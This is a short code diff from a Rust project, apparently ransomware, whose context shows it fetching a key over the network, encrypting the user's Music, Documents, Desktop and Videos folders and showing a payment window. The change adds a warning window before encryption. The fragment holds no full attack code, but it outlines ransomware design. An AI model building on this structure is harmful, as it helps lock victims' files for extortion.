@@ -6,6 +6,7 @@ use anyhow::Result;
 use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
 use c_monster_co_2ic80::networking::client::gen_key;
 use c_monster_co_2ic80::gui::payment::show_payment_window;
+use c_monster_co_2ic80::gui::warning::show_warning_window;
 
 use sodiumoxide::crypto::box_::{PublicKey};
 
@@ -33,6 +34,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let pk: PublicKey = gen_key().await?;
 
     let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
+
+    show_warning_window();
 
     unsafe {
         for path in paths {
